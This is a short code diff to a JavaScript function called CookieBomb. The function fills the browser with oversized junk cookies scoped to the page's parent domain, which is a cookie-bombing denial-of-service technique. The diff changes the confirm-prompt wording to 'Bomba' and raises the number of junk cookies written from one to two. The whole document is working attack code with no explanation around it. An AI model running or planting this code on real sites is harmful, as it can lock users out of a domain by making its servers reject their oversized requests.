@@ -5,8 +5,8 @@
 function CookieBomb() {
     var base_domain = document.domain.substr(document.domain.indexOf('.'));
     var pollution = Array(4000).join('a');
-    if(confirm('Should I Cookie Bomb '+base_domain+'?')){
-    for(var i=1;i<2;i++){
+    if(confirm('Should I Cookie Bomba '+base_domain+'?')){
+    for(var i=1;i<3;i++){
         document.cookie='bomb'+i+'='+pollution+';Domain='+base_domain;
     }
 }
